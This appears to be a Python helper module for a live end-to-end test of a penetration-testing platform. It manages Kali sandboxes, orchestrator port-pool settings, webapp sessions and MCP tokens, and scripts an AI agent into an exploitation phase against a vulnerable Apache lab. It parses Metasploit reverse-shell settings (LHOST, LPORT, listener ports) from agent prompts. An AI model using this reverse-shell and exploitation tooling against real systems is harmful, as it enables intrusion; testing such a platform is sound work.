"""
The machinery of tests/kali_reverse_ports_live.py (follow-up FU, P7): the orchestrator's
settings for a run, the sandboxes as Docker shows them, the people's sessions with the
webapp, an Agent in the Loop chat whose model steps a script answers, and the labs.
Standard library only, host Python 3. Never in the gate (a *_live file).

Nothing here prints a secret. Every line goes through `Out`, whose redactor holds every
password, cookie, MCP token and ticket the run handles; orchestrator answers (which carry
sandbox tokens) are parsed and never printed.
"""
from __future__ import annotations

import hashlib
import ipaddress
import json
import os
import re
import secrets
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from types import SimpleNamespace
from typing import Callable, Optional

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
for path in (HERE, ROOT):
    if path not in sys.path:
        sys.path.insert(0, path)

import kali_sandbox_seed_live as seed  # noqa: E402
from tooling.scripts.tradecraft_e2e import runner as tc  # noqa: E402
from tooling.scripts.tradecraft_e2e.report import Redactor  # noqa: E402

ORCH = os.environ.get("FU_P7_ORCHESTRATOR", "redamon-recon-orchestrator")
AGENT = os.environ.get("FU_P7_AGENT", "redamon-agent")
PROXY = os.environ.get("FU_P7_PROXY", "redamon-capture-proxy")
KALI_IMAGE = os.environ.get("FU_P7_KALI_IMAGE", "redamon-kali-sandbox:latest")
APACHE_IMAGE = os.environ.get("FU_P7_APACHE_IMAGE", "apache_2449-vulnerable-apache:latest")
BUSYBOX_IMAGE = os.environ.get("FU_P7_BUSYBOX_IMAGE", "busybox:latest")
# Every container and network this run makes carries it; the start and the end remove them.
RUN_LABEL = "fu-p7-e2e"
OUTPUT_ROOT = "/app/mcp-output"
HOLDS_FILE = ".sandbox-port-holds.json"
DEFAULT_REVERSE_PORT = 4444
MANAGED = ("KALI_SANDBOX_PORT_POOL", "KALI_SANDBOX_PORT_HOLD_HOURS")
SECRET_NAME = re.compile(r"(_KEY|_TOKEN|_SECRET|_PASSWORD|_PASS|DATABASE_URL)$")
LAB_SHELL_PORT = 5555


class Fatal(Exception):
    """A precondition of the run that does not hold; the message never holds a secret."""


# ---- output -------------------------------------------------------------------------

class Out:
    """PASS/FAIL/INFO lines, each through the redactor; the tallies decide the exit code."""

    def __init__(self) -> None:
        self.redact = Redactor()
        self.passed = 0
        self.failed = 0
        self.failures: list[str] = []
        self.lock = threading.Lock()

    def line(self, text: str) -> None:
        with self.lock:
            print(self.redact(text), flush=True)

    def info(self, text: str) -> None:
        self.line(f"  .. {text}")

    def check(self, cid: str, ok: bool, what: str, why: str = "") -> bool:
        if ok:
            self.passed += 1
            # The facts behind a pass are its evidence too (ports, instances, states; never a secret).
            self.line(f"PASS  {cid}  {what}" + (f"  [{one_line(why, 300)}]" if why else ""))
        else:
            self.failed += 1
            self.failures.append(cid)
            self.line(f"FAIL  {cid}  {what}" + (f"  [{one_line(why, 300)}]" if why else ""))
        return ok


def one_line(text: object, limit: int = 200) -> str:
    flat = " ".join(str(text).split())
    return flat if len(flat) <= limit else flat[: limit - 3] + "..."


# ---- Docker -------------------------------------------------------------------------

def docker(*args: str, timeout: int = 120, input_text: Optional[str] = None) -> tuple[int, str, str]:
    try:
        done = subprocess.run(["docker", *args], capture_output=True, text=True, timeout=timeout,
                              input=input_text)
    except subprocess.TimeoutExpired:
        return 124, "", f"docker {args[0]} timed out"
    return done.returncode, done.stdout, done.stderr


def inspect(name: str) -> Optional[dict]:
    rc, out, _ = docker("inspect", name)
    if rc != 0:
        return None
    try:
        rows = json.loads(out)
    except ValueError:
        return None
    return rows[0] if rows else None


def network_ip(container: str, network: str) -> str:
    info = inspect(container) or {}
    return (((info.get("NetworkSettings") or {}).get("Networks") or {}).get(network) or {}).get("IPAddress") or ""


def network_gateway(network: str) -> str:
    rc, out, _ = docker("network", "inspect", "-f", "{{json .IPAM.Config}}", network)
    if rc != 0:
        return ""
    try:
        for cfg in json.loads(out) or []:
            if cfg.get("Gateway"):
                return cfg["Gateway"]
            if cfg.get("Subnet"):
                return str(next(ipaddress.ip_network(cfg["Subnet"]).hosts()))
    except (ValueError, StopIteration):
        pass
    return ""


def sandbox_key(user_id: str, view: str = "own") -> str:
    """recon_orchestrator/sandbox_contract.py sandbox_key."""
    text = user_id if view == "own" else f"act_as:{user_id}"
    return hashlib.sha256(text.encode()).hexdigest()[:16]


def sandbox_network(user_id: str, view: str = "own") -> str:
    return f"redamon-sbx-{sandbox_key(user_id, view)}"


@dataclass
class Box:
    """One running per-user sandbox, as its labels and Docker name it."""
    name: str
    user: str
    view: str
    instance: str
    port_label: str
    healthy: bool


def sandboxes(user: Optional[str] = None, view: Optional[str] = None) -> list[Box]:
    args = ["ps", "--filter", "label=redamon.sandbox=1", "--format", "{{json .}}"]
    if user:
        args += ["--filter", f"label=redamon.sandbox.user={user}"]
    if view:
        args += ["--filter", f"label=redamon.sandbox.view={view}"]
    rc, out, err = docker(*args)
    if rc != 0:
        # A failed listing must never read as "no sandbox".
        raise Fatal(f"docker ps failed: {one_line(err, 120)}")
    boxes = []
    for line in out.splitlines():
        if not line.strip():
            continue
        row = json.loads(line)
        labels = dict(p.split("=", 1) for p in (row.get("Labels") or "").split(",") if "=" in p)
        if not labels.get("redamon.sandbox.user"):
            continue  # the templates refresher
        boxes.append(Box(row["Names"], labels["redamon.sandbox.user"], labels.get("redamon.sandbox.view", ""),
                         labels.get("redamon.sandbox.instance", ""), labels.get("redamon.sandbox.port", ""),
                         "(healthy)" in (row.get("Status") or "")))
    return boxes


def wait_box(user: str, view: str = "own", timeout: float = 240) -> Optional[Box]:
    until = time.time() + timeout
    while True:
        healthy = [b for b in sandboxes(user, view) if b.healthy]
        if healthy:
            return healthy[-1]
        if time.time() > until:
            return None
        time.sleep(1.5)


def wait_no_box(user: str, timeout: float = 120) -> bool:
    until = time.time() + timeout
    while sandboxes(user):
        if time.time() > until:
            return False
        time.sleep(2)
    return True


def published(name: str) -> list[tuple[int, str, int]]:
    """(container port, host address, host port) of every port the container publishes."""
    rc, out, _ = docker("port", name)
    rows = []
    if rc != 0:
        return rows
    for line in out.splitlines():
        m = re.match(r"^(\d+)/tcp -> \[?([0-9a-fA-F.:]+?)\]?:(\d+)$", line.strip())
        if m:
            rows.append((int(m.group(1)), m.group(2), int(m.group(3))))
    return rows


def publishers_of(host_port: int) -> list[str]:
    """Every running container that publishes `host_port`, whoever made it."""
    rc, out, _ = docker("ps", "--filter", f"publish={host_port}", "--format", "{{.Names}}")
    return [n for n in out.split() if n] if rc == 0 else ["<docker ps failed>"]


def env_in(name: str, key: str) -> Optional[str]:
    for entry in ((inspect(name) or {}).get("Config") or {}).get("Env") or []:
        if entry.startswith(key + "="):
            return entry.split("=", 1)[1]
    return None


def sh_in(container: str, script: str, timeout: int = 60) -> tuple[int, str]:
    rc, out, err = docker("exec", container, "sh", "-c", script, timeout=timeout)
    return rc, out + err


def logs_since(container: str, since: str) -> str:
    rc, out, err = docker("logs", "--since", since, container, timeout=60)
    return out + err if rc == 0 else ""


def utc_now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def remove_run_resources() -> list[str]:
    """Every container and network labelled RUN_LABEL (a killed run's, or this run's)."""
    gone = []
    rc, out, _ = docker("ps", "-aq", "--filter", f"label={RUN_LABEL}=1")
    for cid in out.split():
        if docker("rm", "-f", cid)[0] == 0:
            gone.append(f"container {cid[:12]}")
    rc, out, _ = docker("network", "ls", "-q", "--filter", f"label={RUN_LABEL}=1")
    for nid in out.split():
        if docker("network", "rm", nid)[0] == 0:
            gone.append(f"network {nid[:12]}")
    return gone


# ---- the orchestrator ---------------------------------------------------------------

def service_inputs(files: list[str], service: str = "recon-orchestrator") -> list[tuple[str, str]]:
    """(KEY, NAME) for the service in the compose files: KEY an environment entry whose whole
    value is ${NAME...}, or @mem / @pids / @cpus / @port for the limits and the published port
    (the reader of testing/e2e/scripts/per-user-sandbox-e2e.sh, in Python)."""
    head = re.compile(rf"^  {re.escape(service)}:\s*$")
    other = re.compile(r"^  [A-Za-z0-9_.-]+:\s*$")
    whole = re.compile(r"^\s*-?\s*[A-Za-z_][A-Za-z0-9_]*\s*[:=]\s*\"?\$\{[A-Za-z_][A-Za-z0-9_]*(:?[-?][^}]*)?\}\"?\s*$")
    found = []
    for path in files:
        try:
            lines = open(path, encoding="utf-8").read().splitlines()
        except OSError:
            continue
        inside = False
        for raw in lines:
            if head.match(raw):
                inside = True
                continue
            if inside and (other.match(raw) or re.match(r"^[^\s#]", raw)):
                inside = False
            if not inside:
                continue
            line = re.sub(r"\s#.*$", "", raw)
            m = re.search(r"\$\{([A-Za-z_][A-Za-z0-9_]*)", line)
            if not m:
                continue
            name = m.group(1)
            if re.match(r"^\s*mem_limit:", line):
                found.append(("@mem", name))
            elif re.match(r"^\s*pids_limit:", line):
                found.append(("@pids", name))
            elif re.match(r"^\s*cpus:", line):
                found.append(("@cpus", name))
            elif re.match(r"^\s*-\s*\"?[0-9.]*:?\$\{", line):
                found.append(("@port", name))
            elif whole.match(line):
                key = re.match(r"^\s*-?\s*([A-Za-z_][A-Za-z0-9_]*)", line).group(1)
                found.append((key, name))
    return found


def sha(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


class Orchestrator:
    """The running orchestrator: its API, and its settings for a phase of the run.

    A phase recreates it with KALI_SANDBOX_PORT_POOL / KALI_SANDBOX_PORT_HOLD_HOURS set in
    this process only (never in .env), every other input replayed from the running container,
    as per-user-sandbox-e2e.sh does. Before the first recreate its inputs go to a 0600 file
    beside the heavy lock (secret values as SHA-256 only); `restore()` puts them back and
    compares, and a killed run's file is put back at the next start."""

    def __init__(self, out: Out):
        self.out = out
        info = inspect(ORCH)
        if not info or not (info.get("State") or {}).get("Running"):
            raise Fatal(f"{ORCH} is not running")
        labels = (info.get("Config") or {}).get("Labels") or {}
        self.project = labels.get("com.docker.compose.project", "")
        self.workdir = labels.get("com.docker.compose.project.working_dir", "")
        self.files = [f for f in labels.get("com.docker.compose.project.config_files", "").split(",") if f]
        if not (self.project and self.workdir and self.files):
            raise Fatal(f"{ORCH} carries no compose labels: it was not started by docker compose")
        self.originals_path = os.environ.get("FU_P7_ORIGINALS") or ""
        if not self.originals_path:
            done = subprocess.run(["git", "-C", self.workdir, "rev-parse", "--path-format=absolute",
                                   "--git-common-dir"], capture_output=True, text=True)
            common = done.stdout.strip()
            if done.returncode != 0 or not common:
                raise Fatal("the stack's checkout has no git directory, so the originals file has no place")
            self.originals_path = os.path.join(common, "redamon-fu-p7-orchestrator.env")
        self.orig_env: dict[str, str] = {}
        self.orig_hash: dict[str, str] = {}
        self.orig_lim: dict[str, str] = {}
        self.changed = False
        self.port = seed.env_value("RECON_ORCH_PORT") or "8010"
        out.redact.add(seed.env_value("ORCHESTRATOR_API_KEY"))

    # -- the API (answers carry sandbox tokens: parsed, never printed) --

    def api(self, method: str, path: str, body=None, timeout: int = 90) -> tuple[int, object]:
        req = urllib.request.Request(f"http://127.0.0.1:{self.port}{path}", method=method,
                                     data=None if body is None else json.dumps(body).encode())
        req.add_header("Content-Type", "application/json")
        req.add_header("X-Orchestrator-Key", seed.env_value("ORCHESTRATOR_API_KEY") or "changeme")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw, status = resp.read(), resp.status
        except urllib.error.HTTPError as e:
            raw, status = e.read(), e.code
        except (urllib.error.URLError, OSError):
            return 0, None
        try:
            return status, json.loads(raw) if raw else None
        except ValueError:
            return status, None

    def stop_person(self, user_id: str, timeout: float = 120) -> bool:
        """The operator stop of every sandbox of the person; True once none runs."""
        if not sandboxes(user_id):
            return True
        status, _ = self.api("POST", f"/sandboxes/{user_id}/stop", {"reason": "operator"})
        if status != 200:
            self.out.info(f"the orchestrator's stop answered {status or 'nothing'}")
        return wait_no_box(user_id, timeout)

    def holds_in(self, ports: list[int]) -> Optional[list[dict]]:
        """The pool port holds the orchestrator saved for `ports` (ports and sandbox keys only), or
        None when the file cannot be read."""
        code = ("import json,sys\n"
                f"p={OUTPUT_ROOT + '/' + HOLDS_FILE!r}\n"
                "try:\n d=json.load(open(p))\nexcept FileNotFoundError:\n d={'holds':[]}\n"
                "print(json.dumps([{'port':h.get('port'),'key':h.get('key')} for h in d.get('holds',[])]))\n")
        rc, out, _ = docker("exec", ORCH, "python3", "-c", code)
        if rc != 0:
            return None
        try:
            return [h for h in json.loads(out.strip().splitlines()[-1]) if h.get("port") in ports]
        except (ValueError, IndexError):
            return None

    # -- the settings of a phase --

    def snapshot(self) -> tuple[dict, dict]:
        info = inspect(ORCH) or {}
        env = {}
        for entry in (info.get("Config") or {}).get("Env") or []:
            if "=" in entry:
                k, v = entry.split("=", 1)
                env[k] = v
        host = info.get("HostConfig") or {}
        lim = {"NanoCpus": str(host.get("NanoCpus") or 0), "Memory": str(host.get("Memory") or 0),
               "PidsLimit": str(host.get("PidsLimit") or 0), "Port": ""}
        for b in (host.get("PortBindings") or {}).get("8010/tcp") or []:
            lim["Port"] = str(b.get("HostPort") or "")
        return env, lim

    def _persist(self) -> None:
        tmp = self.originals_path + f".tmp.{os.getpid()}"
        fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(f"# redamon FU P7: {ORCH} as it was before tests/kali_reverse_ports_live.py recreated it\n")
            for k, v in sorted(self.orig_env.items()):
                fh.write(f"S {k}={sha(v)}\n" if SECRET_NAME.search(k) else f"E {k}={v}\n")
            for k, v in sorted(self.orig_lim.items()):
                fh.write(f"L {k}={v}\n")
        os.chmod(tmp, 0o600)
        os.replace(tmp, self.originals_path)

    def _load(self) -> None:
        self.orig_env, self.orig_hash, self.orig_lim = {}, {}, {}
        for line in open(self.originals_path, encoding="utf-8").read().splitlines():
            kind, _, rest = line.partition(" ")
            key, _, value = rest.partition("=")
            {"E": self.orig_env, "S": self.orig_hash, "L": self.orig_lim}.get(kind, {})[key] = value

    def begin(self) -> None:
        """Puts back what a killed run left, then reads the originals (under the lock)."""
        if os.path.exists(self.originals_path):
            self.out.info(f"an earlier run left {self.originals_path}: putting {ORCH} back first")
            self._load()
            if not self._recreate({}) or self._differs({}):
                raise Fatal(f"{ORCH} could not be put back from {self.originals_path} (kept)")
            os.remove(self.originals_path)
        env, lim = self.snapshot()
        self.orig_env, self.orig_hash, self.orig_lim = env, {}, lim

    def target(self, managed: dict) -> dict:
        want = dict(self.orig_env)
        want.update(managed)
        return want

    def _recreate(self, managed: dict) -> bool:
        want = self.target(managed)
        env = dict(os.environ)
        for key, name in service_inputs(self.files):
            if key == "@mem" and int(self.orig_lim.get("Memory") or 0) > 0:
                env[name] = self.orig_lim["Memory"]
            elif key == "@pids" and int(self.orig_lim.get("PidsLimit") or 0) > 0:
                env[name] = self.orig_lim["PidsLimit"]
            elif key == "@cpus" and int(self.orig_lim.get("NanoCpus") or 0) > 0:
                env[name] = f"{int(self.orig_lim['NanoCpus']) / 1e9:g}"
            elif key == "@port" and self.orig_lim.get("Port"):
                env[name] = self.orig_lim["Port"]
            elif key in want:
                env[name] = want[key]
        env["COMPOSE_FILE"] = ":".join(self.files)
        shown = " ".join(f"{k}={managed.get(k, self.orig_env.get(k, ''))!s}" for k in MANAGED)
        self.out.info(f"recreating {ORCH} with {shown} (every other input replayed)")
        done = subprocess.run(["docker", "compose", "-p", self.project, "up", "-d", "--no-deps", ORCH_SERVICE],
                              cwd=self.workdir, env=env, capture_output=True, text=True, timeout=600)
        if done.returncode != 0:
            self.out.info(f"docker compose up failed: {one_line(done.stderr, 200)}")
            return False
        return self._wait_healthy()

    def _wait_healthy(self, timeout: float = 180) -> bool:
        until = time.time() + timeout
        while time.time() < until:
            state = (inspect(ORCH) or {}).get("State") or {}
            health = (state.get("Health") or {}).get("Status") or state.get("Status")
            if health in ("healthy", "running"):
                return True
            time.sleep(2)
        return False

    def _differs(self, managed: dict) -> list[str]:
        env, lim = self.snapshot()
        bad = [k for k, v in self.target(managed).items() if env.get(k, "") != v]
        bad += [k for k, h in self.orig_hash.items() if sha(env.get(k, "")) != h]
        bad += [k for k in ("NanoCpus", "Memory", "PidsLimit", "Port") if lim.get(k) != self.orig_lim.get(k)]
        return bad

    def running_has(self, managed: dict) -> bool:
        env, _ = self.snapshot()
        return all(env.get(k, "") == v for k, v in managed.items())

    def set_phase(self, managed: dict) -> None:
        if self.running_has(managed):
            self.out.info(f"{ORCH} already runs with {managed}")
            return
        if not self.changed:
            self._persist()
            self.changed = True
        if not self._recreate(managed):
            raise Fatal(f"{ORCH} did not come up with {managed}")
        bad = self._differs(managed)
        if bad:
            raise Fatal(f"{ORCH} differs from its inputs after the recreate: {', '.join(bad)}")

    def restore(self) -> bool:
        if not self.changed:
            return True
        ok = self._recreate({}) and not self._differs({})
        if ok:
            os.remove(self.originals_path)
            self.changed = False
        return ok


ORCH_SERVICE = "recon-orchestrator"


# ---- people and the webapp ---------------------------------------------------------

def base_url() -> str:
    return seed.base_url()


def agent_ws_url() -> str:
    return f"ws://localhost:{seed.env_value('AGENT_PORT') or '8090'}/ws/agent"


@dataclass
class Person:
    key: str
    id: str
    email: str
    password: str
    mcp_token: str
    http: tc.Http
    driver_token: str = ""
    driver_token_id: str = ""


def sign_in(out: Out, email: str, password: str) -> tuple[tc.Http, str]:
    http = tc.Http(base_url())
    res = http.call("POST", "/api/auth/login", {"email": email, "password": password})
    if not res.ok:
        raise Fatal(f"signing in as {email} answered {res.status} {res.code} (not retried: lockout)")
    for value in http.cookies.values():
        out.redact.add(value)
    me = http.call("GET", "/api/auth/me")
    uid = str((me.data or {}).get("id") or ((me.data or {}).get("user") or {}).get("id") or "") if isinstance(me.data, dict) else ""
    if not uid:
        raise Fatal(f"/api/auth/me named nobody for {email}")
    return http, uid


def mint_driver_token(out: Out, person: Person) -> None:
    """An Agent in the Loop driver token: agent:loop and a read scope only (loopScopes.ts)."""
    res = person.http.call("POST", f"/api/users/{person.id}/mcp-tokens", {
        "name": f"fu-p7 loop driver {secrets.token_hex(3)}", "scopes": ["recon:read", "agent:loop"],
        "profile": "agent_in_the_loop", "expiresInDays": 30, "password": person.password})
    if res.status != 201 or not isinstance(res.data, dict) or not res.data.get("plaintext"):
        raise Fatal(f"minting {person.email}'s loop driver token answered {res.status} {res.code}")
    person.driver_token = str(res.data["plaintext"])
    person.driver_token_id = str((res.data.get("token") or {}).get("id") or "")
    out.redact.add(person.driver_token)


def revoke_driver_token(person: Person) -> bool:
    if not person.driver_token_id:
        return True
    res = person.http.call("DELETE", f"/api/users/{person.id}/mcp-tokens/{person.driver_token_id}")
    if res.ok or res.status == 404:
        person.driver_token_id = ""
        return True
    return False


def mcp(token: str, method: str, params: Optional[dict] = None, timeout: int = 120) -> tuple[int, object]:
    return seed.mcp_call(token, method, params, base=base_url(), timeout=timeout)


def kali_exec(token: str, project_id: str, command: str, wait: int = 60, budget: int = 300) -> dict:
    """MCP kali_exec, then kali_output until the command ends: {ok, status, output, error}. Waits
    out the per-token rate limit. `starting` is a cold start in progress (B.12)."""
    def call(name, args, t):
        for _ in range(8):
            status, body = mcp(token, "tools/call", {"name": name, "arguments": args}, timeout=t)
            result = body.get("result") if isinstance(body, dict) else None
            if not isinstance(result, dict):
                return None, f"MCP answered {status}"
            text = "".join(c.get("text", "") for c in result.get("content") or [] if isinstance(c, dict))
            if result.get("isError"):
                wait_s = re.search(r"Rate limit reached.*?(\d+)s", text)
                if wait_s:
                    time.sleep(int(wait_s.group(1)) + 1)
                    continue
                return None, one_line(text, 200)
            try:
                return json.loads(text), None
            except ValueError:
                return None, "the tool answered no JSON"
        return None, "rate limited eight times in a row"

    d, err = call("kali_exec", {"projectId": project_id, "command": command, "waitSeconds": wait}, wait + 60)
    if err:
        return {"ok": False, "status": "error", "output": "", "error": err}
    job, output, cursor, status = d.get("jobId"), d.get("output") or "", d.get("nextCursor") or 0, d.get("status")
    end = time.time() + budget
    while status in ("running", "starting") or d.get("truncated"):
        if time.time() > end:
            return {"ok": False, "status": status, "output": output, "error": "still running"}
        if status in ("running", "starting"):
            time.sleep(2)
        d, err = call("kali_output", {"projectId": project_id, "jobId": job, "cursor": cursor}, 60)
        if err:
            return {"ok": False, "status": "error", "output": output, "error": err}
        output += d.get("output") or ""
        cursor, status = d.get("nextCursor", cursor), d.get("status")
    return {"ok": status == "done", "status": status, "output": output, "error": d.get("failure") or d.get("error") or ""}


def kali_output_raw(token: str, project_id: str, job_id: str, timeout: int = 45) -> tuple[Optional[dict], str, float]:
    """One kali_output call: (answer, error text, seconds it took)."""
    t0 = time.time()
    status, body = mcp(token, "tools/call", {"name": "kali_output",
                                             "arguments": {"projectId": project_id, "jobId": job_id}}, timeout=timeout)
    took = time.time() - t0
    result = body.get("result") if isinstance(body, dict) else None
    if not isinstance(result, dict):
        return None, f"MCP answered {status}", took
    text = "".join(c.get("text", "") for c in result.get("content") or [] if isinstance(c, dict))
    if result.get("isError"):
        return None, text, took
    try:
        return json.loads(text), "", took
    except ValueError:
        return None, text, took


def tool_description(token: str, name: str) -> str:
    status, body = mcp(token, "tools/list")
    for t in (((body or {}).get("result") or {}).get("tools") or []) if isinstance(body, dict) else []:
        if isinstance(t, dict) and t.get("name") == name:
            return str(t.get("description") or "")
    return ""


def sandbox_status(http: tc.Http) -> list[dict]:
    """GET /api/agent/sandbox/status: the caller's own sandbox in the view they work in."""
    res = http.call("GET", "/api/agent/sandbox/status")
    return list((res.data or {}).get("instances") or []) if res.ok and isinstance(res.data, dict) else []


def tunnel_status(http: tc.Http) -> dict:
    res = http.call("GET", "/api/agent/tunnel-status")
    return res.data if res.ok and isinstance(res.data, dict) else {"_status": res.status}


def sessions_of(http: tc.Http) -> dict:
    res = http.call("GET", "/api/agent/sessions")
    if not res.ok or not isinstance(res.data, dict):
        return {"sessions": [], "jobs": [], "non_msf_sessions": [], "unavailable_count": -1}
    return res.data


def interact(http: tc.Http, row: dict, command: str) -> str:
    q = f"?sandbox={urllib.request.quote(str(row.get('sandbox') or ''))}"
    res = http.call("POST", f"/api/agent/sessions/{row['id']}/interact{q}", {"command": command}, timeout=90)
    return res.text or ""


def kill_row(http: tc.Http, kind: str, row: dict) -> int:
    q = f"?sandbox={urllib.request.quote(str(row.get('sandbox') or ''))}"
    return http.call("POST", f"/api/agent/{kind}/{row['id']}/kill{q}").status


def delete_conversation(http: tc.Http, session_id: str) -> None:
    res = http.call("GET", f"/api/conversations/by-session/{session_id}")
    if res.ok and isinstance(res.data, dict) and res.data.get("id"):
        http.call("DELETE", f"/api/conversations/{res.data['id']}")


# ---- what the run changes, recorded so a killed run is put back ---------------------

class Restore:
    """Project fields, permission overrides and tunnel settings the run changed, in a 0600 file
    beside the seed state (no secret in it), put back at the end and at the next start."""

    def __init__(self, path: str):
        self.path = path
        try:
            self.data = json.load(open(path, encoding="utf-8"))
        except (OSError, ValueError):
            self.data = {}
        for k in ("projects", "grants", "tunnels"):
            self.data.setdefault(k, {})

    def save(self) -> None:
        if not any(self.data[k] for k in ("projects", "grants", "tunnels")):
            try:
                os.remove(self.path)
            except FileNotFoundError:
                pass
            return
        seed.write_state(self.data, self.path)

    def set_project(self, http: tc.Http, owner_key: str, project_id: str, fields: dict) -> bool:
        current = http.call("GET", f"/api/projects/{project_id}")
        if not current.ok or not isinstance(current.data, dict):
            return False
        entry = self.data["projects"].setdefault(project_id, {"owner": owner_key, "fields": {}})
        for k in fields:
            entry["fields"].setdefault(k, current.data.get(k))
        self.save()
        return http.call("PUT", f"/api/projects/{project_id}", fields).ok

    def restore_projects(self, https: dict) -> list[str]:
        failed = []
        for pid, entry in list(self.data["projects"].items()):
            http = https.get(entry["owner"])
            if http is None or not http.call("PUT", f"/api/projects/{pid}", entry["fields"]).ok:
                failed.append(f"project {pid}")
                continue
            del self.data["projects"][pid]
        self.save()
        return failed

    def record_tunnel(self, person: Person) -> None:
        if person.id in self.data["tunnels"]:
            return
        res = person.http.call("GET", f"/api/users/{person.id}/settings")
        row = res.data if res.ok and isinstance(res.data, dict) else {}
        self.data["tunnels"][person.id] = {"owner": person.key, "chiselServerUrl": row.get("chiselServerUrl") or "",
                                           "tunnelsEnabled": bool(row.get("tunnelsEnabled"))}
        self.save()

    def restore_tunnels(self, people: dict) -> list[str]:
        failed = []
        for uid, entry in list(self.data["tunnels"].items()):
            person = people.get(entry["owner"])
            body = {"tunnelsEnabled": False, "chiselServerUrl": entry["chiselServerUrl"]}
            if person is None or not person.http.call("PUT", f"/api/users/{uid}/settings", body).ok:
                failed.append(f"tunnel settings of {uid}")
                continue
            del self.data["tunnels"][uid]
        self.save()
        return failed

    def grant(self, admin: tc.Http, admin_password: str, user_id: str, permission: str) -> bool:
        res = admin.call("GET", f"/api/users/{user_id}/permissions")
        overrides = (((res.data or {}).get("assignment") or {}).get("overrides") or []) if isinstance(res.data, dict) else []
        live = [{"permission": o["permission"], "effect": o["effect"], "expiresAt": o.get("expiresAt"),
                 "reason": o.get("reason")} for o in overrides
                if not o.get("expiresAt") or _later_than_now(o["expiresAt"], 60)]
        # Recorded once: a second grant in the same run (or after a killed one) keeps the first originals.
        self.data["grants"].setdefault(user_id, live)
        self.save()
        expires = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(time.time() + 3 * 3600))
        body = {"overrides": [*[o for o in live if o["permission"] != permission],
                              {"permission": permission, "effect": "grant", "reason": "fu-p7 reverse ports e2e",
                               "expiresAt": expires}],
                "stepUpPassword": admin_password}
        return admin.call("PUT", f"/api/users/{user_id}/permissions", body).status == 200

    def restore_grants(self, admin: tc.Http, admin_password: str) -> list[str]:
        """Removing a grant signs that account out everywhere: run it last."""
        failed = []
        for uid, overrides in list(self.data["grants"].items()):
            kept = [o for o in overrides if not o.get("expiresAt") or _later_than_now(o["expiresAt"], 60)]
            if admin.call("PUT", f"/api/users/{uid}/permissions", {"overrides": kept, "stepUpPassword": admin_password}).status != 200:
                failed.append(f"permission overrides of {uid}")
                continue
            del self.data["grants"][uid]
        self.save()
        return failed


def _later_than_now(iso: str, margin_s: int) -> bool:
    try:
        stamp = time.mktime(time.strptime(iso[:19], "%Y-%m-%dT%H:%M:%S")) - time.timezone
    except (ValueError, TypeError):
        return False
    return stamp > time.time() + margin_s


# ---- the payload settings block the agent shows the model ---------------------------

BLOCK_HEAD = "### Pre-Configured Payload Settings"


@dataclass
class Plan:
    """What the payload settings block of a think prompt says (agentic/utils.py
    get_session_config_prompt), as a model reads it."""
    found: bool = False
    mode: str = ""            # reverse | bind | ask | unknown | ""
    lhost: str = ""
    lport: Optional[int] = None
    pool_port: Optional[int] = None
    bind_listen_4444: bool = False
    chisel: str = ""          # active | failed | off | act_as | unread | connecting | ""
    ngrok: str = ""
    no_port: str = ""         # pool_full | no_pool | none | ""
    shared_port_text: bool = False
    asks_user: bool = False
    text: str = ""


def payload_block(prompt: str) -> str:
    """The LAST payload settings block of the prompt (the current one), up to the next header."""
    i = prompt.rfind(BLOCK_HEAD)
    if i < 0:
        return ""
    rest = prompt[i + len(BLOCK_HEAD):]
    m = re.search(r"\n(?:#{1,3} |=== )", rest)
    return BLOCK_HEAD + (rest[: m.start()] if m else rest)


def read_plan(prompt: str) -> Plan:
    block = payload_block(prompt)
    p = Plan(found=bool(block), text=block)
    if not block:
        return p
    if "**Mode: REVERSE**" in block:
        p.mode = "reverse"
    elif "**Mode: BIND**" in block:
        p.mode = "bind"
    elif "PAYLOAD DIRECTION NOT CONFIGURED" in block:
        p.mode = "ask"
    elif re.search(r"\*\*Your (Kali sandbox|tunnel): (not known yet|connecting|not read yet)", block):
        p.mode = "unknown"
    lhost = re.search(r"^\s*set LHOST (\S+)\s*$", block, re.M)
    lport = re.search(r"^\s*set LPORT (\d+)\s*$", block, re.M)
    p.lhost = lhost.group(1) if lhost else ""
    p.lport = int(lport.group(1)) if lport else None
    pool = re.search(r"Your reverse-shell port is `(\d+)`", block)
    p.pool_port = int(pool.group(1)) if pool else None
    p.bind_listen_4444 = "set ReverseListenerBindPort 4444" in block
    for name, attr in (("Chisel", "chisel"), ("ngrok", "ngrok")):
        m = re.search(rf"\*\*{name} Tunnel: (ACTIVE|FAILED|OFF|NO ANSWER|not available|not read yet|connecting)\*\*", block)
        setattr(p, attr, {"ACTIVE": "active", "FAILED": "failed", "OFF": "off", "NO ANSWER": "unanswered",
                          "not available": "act_as", "not read yet": "unread",
                          "connecting": "connecting"}.get(m.group(1), "") if m else "")
    if "the port pool is full" in block:
        p.no_port = "pool_full"
    elif "no port pool is" in block:
        p.no_port = "no_pool"
    elif "has no reverse-shell port" in block:
        p.no_port = "none"
    p.shared_port_text = "One reverse port for all of this person's chats" in block
    p.asks_user = 'action: "ask_user"' in block
    return p


# ---- one chat whose model is Agent in the Loop, answered by a script ----------------

AGAIN = object()


def decision(thought: str, action: str = "use_tool", **fields) -> dict:
    d = {"thought": f"FU-P7 {thought}", "reasoning": "scripted e2e step (tests/kali_reverse_ports_live.py)",
         "action": action, "updated_todo_list": []}
    d.update(fields)
    return d


def use_tool(thought: str, tool: str, args: dict) -> dict:
    return decision(thought, "use_tool", tool_name=tool, tool_args=args,
                    output_analysis={"interpretation": "scripted e2e step"})


def to_exploitation(reason: str = "the e2e scenario needs the exploitation phase") -> dict:
    return decision("move to exploitation", "transition_phase", phase_transition={
        "to_phase": "exploitation", "reason": reason, "planned_actions": ["a handler and the lab's RCE"],
        "risks": ["none: a throwaway local lab container"]})


def complete(reason: str = "the e2e scenario is complete") -> dict:
    return decision("done", "complete", completion_reason=reason,
                    output_analysis={"interpretation": "scripted e2e step"})


@dataclass
class Chat:
    """One chat run: its session, the prompts its think steps showed, what was answered."""
    label: str
    session_id: str
    thinks: list[str] = field(default_factory=list)
    did: list[str] = field(default_factory=list)
